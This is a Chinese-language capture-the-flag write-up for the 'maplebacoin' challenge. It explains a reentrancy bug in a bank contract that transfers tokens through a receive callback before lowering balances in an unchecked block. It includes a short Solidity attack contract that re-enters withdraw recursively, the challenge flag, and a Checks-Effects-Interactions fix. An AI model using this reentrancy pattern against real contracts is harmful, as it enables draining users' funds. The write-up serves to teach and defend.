# maplebacoin

## 题目简述

题目部署了一枚带接收回调的 ERC-20 风格代币和一个银行合约。玩家需要让自己的代币余额达到 100。银行的 `withdraw` 会先向调用者转账并触发 `receiveCoin`，随后才在 `unchecked` 块中扣减内部存款，形成典型的“外部调用在前、状态更新在后”重入漏洞。

## 解题过程

先从水龙头取得少量代币，批准银行合约并存入 1 枚，使攻击合约的银行余额非零。随后调用一次 `withdraw(1)`。代币转账到攻击合约时触发 `receiveCoin`；此时银行还没有执行余额扣减，查询到的内部余额仍为 1，因此回调可以再次调用 `withdraw(1)`。

攻击合约只需在余额达到目标前递归：

```solidity
function attack() external {
    token.approve(address(bank), 1);
    bank.deposit(1);
    bank.withdraw(1);
}

function receiveCoin(address, uint256) external {
    if (token.balanceOf(address(this)) < 100) {
        bank.withdraw(1);
    }
}
```

每层调用返回时，银行才在 `unchecked` 中执行减法。第一次扣减后余额变为 0，后续层继续下溢而不会回滚，因此整条重入链能够完成。把得到的代币转给玩家或直接调用题目的完成检查，得到：

```text
maple{code_quality_on_par_with_scam_tokens}
```

## 方法总结

带接收钩子的代币转账本质上是一次不可信外部调用，审计方式应与 ERC-777 回调相同。修复应采用 Checks-Effects-Interactions：先扣减余额，再转账，并增加重入锁；不能依赖 `unchecked` 或“每次只能提现 1 枚”来限制攻击，因为重入发生时旧状态仍然可见。
